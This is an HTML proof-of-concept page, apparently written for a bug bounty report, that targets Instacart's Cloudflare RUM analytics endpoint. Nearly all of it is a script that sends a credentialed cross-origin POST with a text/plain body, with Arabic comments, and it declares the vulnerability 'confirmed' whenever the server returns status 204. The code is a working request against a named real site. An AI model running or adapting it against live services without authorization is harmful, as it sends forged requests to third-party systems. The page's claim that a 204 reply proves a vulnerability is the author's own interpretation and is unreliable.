<!DOCTYPE html>
<html>
<head>
    <title>Instacart CORS POC (Final)</title>
</head>
<body>
    <h2>CORS POC for Instacart RUM Endpoint</h2>
    <p>Open developer tools (F12) and check the Console and Network tabs.</p>
    <button type="button" onclick="exploit()">Run Final Exploit</button>
    <p id="result"></p>

    <script>
        function exploit() {
            console.log("Sending final CORS request...");
            document.getElementById("result").innerText = "Sending request...";

            var xhttp = new XMLHttpRequest();
            var url = "https://www.instacart.com/cdn-cgi/rum?";

            var body = {
                "referrer": "https://your-github-username.github.io",
                "eventType": 3,
                "pageloadId": "bb69e27b-6301-49cd-97dc-788699bb3b83",
                "location": "https://your-github-username.github.io/poc-repo/"
            };

            xhttp.onreadystatechange = function() {
                if (this.readyState == 4) {
                    if (this.status == 204) {
                        console.log("SUCCESS! Request accepted by server with status 204 No Content.");
                        document.getElementById("result").innerText = "Success! The server accepted the cross-origin request with status 204. Vulnerability confirmed.";
                        document.getElementById("result").style.color = "green";
                    } else {
                        console.error("FAILED. Status: " + this.status);
                        document.getElementById("result").innerText = "Failed. Status: " + this.status + ". See console for details.";
                        document.getElementById("result").style.color = "red";
                    }
                }
            };

            xhttp.open("POST", url, true);
            xhttp.withCredentials = true; 
            
            //  !!! التغيير الحاسم والنهائي هنا !!!
            xhttp.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");

            xhttp.send(JSON.stringify(body)); // نتركها كما هي لأنها تحول الكائن إلى نص عادي
        }
    </script>
</body>
</html>
